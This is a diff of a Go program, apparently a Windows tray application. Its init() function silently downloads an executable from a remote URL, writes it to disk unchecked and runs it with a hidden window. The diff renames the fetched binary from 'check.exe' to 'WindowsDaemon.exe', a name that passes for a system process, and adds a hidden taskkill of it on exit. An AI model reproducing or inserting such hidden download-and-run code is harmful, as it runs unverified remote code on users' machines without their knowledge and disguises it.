@@ -89,9 +89,13 @@ func onReady() {
 }
 func onExit() {
 	// clean up here
+	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsDaemon.exe")
+	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	// not Start will continue
+	killcheck.Run()
 }
 func init() {
-	killcheck := exec.Command("taskkill", "/f", "/im", "check.exe")
+	killcheck := exec.Command("taskkill", "/f", "/im", "WindowsDaemon.exe")
 	killcheck.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	// not Start will continue
 	killcheck.Run()
@@ -101,20 +105,20 @@ func init() {
 	if ioutil.WriteFile(CURRENTPATHLOG, data, 0644) == nil {
 	}
 	//fixed ioop download check
-	_, cerr := os.Stat(CURRENTPATH + "check.exe")
+	_, cerr := os.Stat(CURRENTPATH + "WindowsDaemon.exe")
 	if cerr != nil {
 		//keep the main process live
-		resp, err := http.Get(lib.MIDFILE + "check.exe")
+		resp, err := http.Get(lib.MIDFILE + "WindowsDaemon.exe")
 		if err != nil {
 			return
 		}
 		body, _ := ioutil.ReadAll(resp.Body)
-		ioutil.WriteFile(CURRENTPATH+"check.exe", body, 0644)
-		cmd := exec.Command(CURRENTPATH + "check.exe")
+		ioutil.WriteFile(CURRENTPATH+"WindowsDaemon.exe", body, 0644)
+		cmd := exec.Command(CURRENTPATH + "WindowsDaemon.exe")
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		cmd.Start()
 	} else {
-		cmd := exec.Command(CURRENTPATH + "check.exe")
+		cmd := exec.Command(CURRENTPATH + "WindowsDaemon.exe")
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 		cmd.Start()
 	}
